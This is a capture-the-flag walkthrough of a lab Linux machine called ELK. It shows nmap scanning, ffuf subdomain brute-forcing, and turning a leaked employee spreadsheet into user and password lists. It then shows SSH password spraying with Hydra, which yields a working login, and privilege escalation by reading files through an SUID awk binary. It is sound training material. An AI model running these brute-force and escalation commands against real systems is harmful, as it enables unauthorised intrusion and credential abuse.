---
layout: post
title: "CTF7E4 - ELK Machine"
categories: CTF7E4
---

## Summary
&nbsp;
This machine was more about enumeration and bruteforcing, such as finding new subdomains that are not visible by default on ssl cert and ssh spraying using different tools for bruteforcing such as THC-Hydra. The last step for privilege escalation was about abusing a native linux binary which had SUID permissions.
&nbsp;

- **OS:** Linux
- **IP:** 10.10.10.11
- **Difficulty:** Medium

## Steps
&nbsp;

In order to hack this machine, we should know what ports are open and we can do that by using a popular tool such as Nmap.

> **→ nmap -sC -sV -oN scan 10.10.10.11**{: style="color: red"}

**-sC** Use default scripts
**-sV** Probe open ports to determine service/version info
**-oN** Save output in nmap format.
&nbsp;

```
Nmap scan report for staging.elk.xor (10.10.10.11)
Host is up (0.028s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:2c:29:d5:e5:86:27:3a:d9:7c:32:88:03:71:db:d5 (RSA)
|   256 0f:cb:76:02:b6:21:28:49:cb:a2:ea:8a:cf:db:dd:98 (ECDSA)
|_  256 83:80:4d:27:13:7f:79:27:79:10:2d:ac:c3:af:91:78 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=elk.xor/organizationName=XOR CyberCommunity/stateOrProvinceName=Some-State/countryName=AL
| Not valid before: 2020-01-12T00:57:06
|_Not valid after:  2021-01-11T00:57:06
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
&nbsp;
&nbsp;

From the nmap scan output, we can see that there is a web server running on port 80 and 443. Browsing to https://10.10.10.11/ and looking at the certificate info, we can identify that port 443 is configured to run on **elk.xor** domain.

&nbsp;
![elk]({{ site.baseurl }}/assets/images/ctf7e4/machines/elk1.png){:.images}
&nbsp;

Running file and directory discovery tools resulted in nothing so we started to bruteforce new subdomains. We can do that using differnet tools such as gobuster, wfuzz, ffuf, etc. I prefer ffuf for it's speed and available options to filter content. While bruteforcing subdomains a lot of them returned with the same page size (10918), so to filter the output we can use **\--fs 10918**.

> **→ ffuf -c -u 'http://10.10.10.11' -w ~/tools/SecLists/Discovery/DNS/shubs-subdomains.txt -H "Host: FUZZ.elk.xor" -fs 10918**{: style="color: red"}

&nbsp;
![elk]({{ site.baseurl }}/assets/images/ctf7e4/machines/elk2.png){:.images}
&nbsp;

New subdomain staging.elk.xor was found. To access this subdomain we should add it to our /etc/hosts file.
> **→ echo '10.10.10.11 staging.elk.xor' >> /etc/hosts**{: style="color: red"}

The message on this subdomain was the same but if we looked at the source code we saw a html commented line as seen in the screenshot below.

&nbsp;
![elk]({{ site.baseurl }}/assets/images/ctf7e4/machines/elk3.png){:.images}
&nbsp;

In the main.js file there was a strange directory and file named **xorsecretdocuments/employee.xlsx**

&nbsp;
![elk]({{ site.baseurl }}/assets/images/ctf7e4/machines/elk4.png){:.images}
&nbsp;

Since **.xlsx** is a format for Microsoft Excel files, we can use an online Excel file viewer.

&nbsp;
![elk]({{ site.baseurl }}/assets/images/ctf7e4/machines/elk5.png){:.images}
&nbsp;

To use this file as a combo list, we can first convert it to a csv file so then we can easily sort fields such as users and passwords.

> **→ cat employee.csv \| cut -d ',' -f 1 >> users.txt**{: style="color: red"}
> **→ cat employee.csv \| cut -d ',' -f 2 >> passwords.txt**{: style="color: red"}

Then we can continue with ssh passwords spraying using Hydra. Some times it's necessary to use different tools such as ncrack, patator or msfconsole auxiliary modules for ssh, to avoid false positives. 

> **→ hydra -L users.txt -P passwords.txt ssh://10.10.10.11 -t 4**{: style="color: red"}

&nbsp;
![elk]({{ site.baseurl }}/assets/images/ctf7e4/machines/elk6.png){:.images}
&nbsp;

```
[DATA] attacking ssh://10.10.10.11:22/
[22][ssh] host: 10.10.10.11   login: crista   password: alejandro
1 of 1 target successfully completed, 1 valid password found
```

&nbsp;
![elk]({{ site.baseurl }}/assets/images/ctf7e4/machines/elk7.png){:.images}
&nbsp;

First things that I like to check for privilege escalation is running **'sudo -l'** command to see if current user has permissions to run a specific command as root without entering the password or being into sudo group.

> **crista@elk:~$ sudo -l**{: style="color: red"}
[sudo] password for crista: ^C

> **crista@elk:~$ cat /etc/group | grep sudo**{: style="color: red"}
sudo:x:27:

Then proceed to finding SUID binaries, if there are any. Now it's much easier when you find one because a great [website](https://gtfobins.github.io) exists, where you can find different PoCs for native binaries.

&nbsp;
![elk]({{ site.baseurl }}/assets/images/ctf7e4/machines/elk8.png){:.images}
&nbsp;

In this machine, **awk** has SUID permissions and can be abused in different ways. We can first try to spawn a shell with root privileges but in our case it didn't work, so we use its file reading function.
&nbsp;

```bash
LFILE=file_to_read
awk '//' "$LFILE"
```

&nbsp;
![elk]({{ site.baseurl }}/assets/images/ctf7e4/machines/elk9.png){:.images}
&nbsp;

&nbsp;
I hope you had fun solving this machine and learning something new.